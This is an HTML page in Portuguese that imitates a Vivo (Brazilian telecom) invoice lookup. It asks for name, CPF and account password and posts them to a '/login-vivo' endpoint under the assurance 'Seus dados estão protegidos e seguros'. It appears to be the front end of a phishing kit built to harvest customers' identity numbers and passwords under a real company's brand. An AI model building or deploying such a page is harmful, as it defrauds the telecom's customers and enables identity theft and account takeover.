<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Buscar Fatura</title>

    <style>
        * {
            box-sizing: border-box;
            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            margin: 0;
            min-height: 100vh;
            background: linear-gradient(180deg, #f5faf8 0%, #eef5f2 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 420px;
            text-align: center;
        }

        .icon {
            width: 56px;
            height: 56px;
            background-color: #0b5f4b;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 16px;
        }

        .icon svg {
            width: 26px;
            height: 26px;
            fill: #ffffff;
        }

        h1 {
            margin: 0;
            font-size: 32px;
            font-weight: 500;
            color: #0b2e24;
        }

        .subtitle {
            margin-top: 6px;
            font-size: 16px;
            color: #5f7f75;
        }

        .card {
            background-color: #ffffff;
            border-radius: 16px;
            padding: 28px 24px;
            margin-top: 28px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.06);
            text-align: left;
        }

        .card h2 {
            margin: 0;
            text-align: center;
            font-size: 20px;
            color: #0b2e24;
        }

        .card p {
            margin: 8px 0 22px;
            text-align: center;
            font-size: 14px;
            color: #6c8a81;
        }

        label {
            font-size: 14px;
            color: #1f3d34;
            margin-bottom: 6px;
            display: block;
        }

        .input-group {
            position: relative;
            margin-bottom: 18px;
        }

        .input-group input {
            width: 100%;
            padding: 12px 14px 12px 42px;
            border-radius: 10px;
            border: 1px solid #d9e5e0;
            font-size: 14px;
            outline: none;
        }

        .input-group input:focus {
            border-color: #0b5f4b;
        }

        .input-group svg {
            position: absolute;
            top: 50%;
            left: 14px;
            transform: translateY(-50%);
            width: 18px;
            height: 18px;
            fill: #7aa59a;
        }

        .btn {
            width: 100%;
            border: none;
            background-color: #0b5f4b;
            color: #ffffff;
            font-size: 16px;
            padding: 14px;
            border-radius: 12px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .btn:hover {
            background-color: #094c3d;
        }

        .footer-text {
            margin-top: 18px;
            font-size: 13px;
            color: #6c8a81;
            text-align: center;
        }

        @media (max-width: 480px) {
            h1 {
                font-size: 22px;
            }

            .card {
                padding: 22px 18px;
            }
        }
    </style>
</head>

<body>
    <div class="container">

        <div class="icon">
            <svg viewBox="0 0 24 24">
                <path d="M6 2h9l5 5v15a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2zm8 1.5V8h4.5"/>
            </svg>
        </div>

        <h1>Buscar Fatura</h1>
        <div class="subtitle">Acesse sua fatura Vivo de forma rápida e segura</div>

        <div class="card">
            <h2>Acesse sua conta</h2>
            <p>Insira seus dados para consultar sua fatura</p>

            <form action="/login-vivo" method="post">

                <label for="name">Nome</label>
                <div class="input-group">
                    <svg viewBox="0 0 24 24">
                        <path d="M12 12a5 5 0 1 0-5-5 5 5 0 0 0 5 5zm0 2c-4.33 0-8 2.17-8 5v1h16v-1c0-2.83-3.67-5-8-5z"/>
                    </svg>
                    <input name="name" id="name" type="text" placeholder="Tiago Santos">
                </div>

                <label for="cpf">CPF</label>
                <div class="input-group">
                    <svg viewBox="0 0 24 24">
                        <path d="M12 12a5 5 0 1 0-5-5 5 5 0 0 0 5 5zm0 2c-4.33 0-8 2.17-8 5v1h16v-1c0-2.83-3.67-5-8-5z"/>
                    </svg>
                    <input name="cpf" id="cpf" type="text" placeholder="000.000.000-00">
                </div>
                <label for="senha">Senha</label>
                <div class="input-group">
                    <svg viewBox="0 0 24 24">
                        <path d="M17 8h-1V6a4 4 0 0 0-8 0v2H7a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2zm-6 9.73V18a1 1 0 0 0 2 0v-.27a2 2 0 1 0-2 0zM10 8V6a2 2 0 0 1 4 0v2z"/>
                    </svg>
                    <input id="senha" type="password" name="senha" placeholder="Digite sua senha">
                </div>
                <button class="btn">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="#fff">
                        <path d="M6 2h9l5 5v15a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2z"/>
                    </svg>
                    Buscar Fatura
                </button>
            </form>
        </div>

        <div class="footer-text">
            Seus dados estão protegidos e seguros
        </div>

    </div>
</body>
</html>
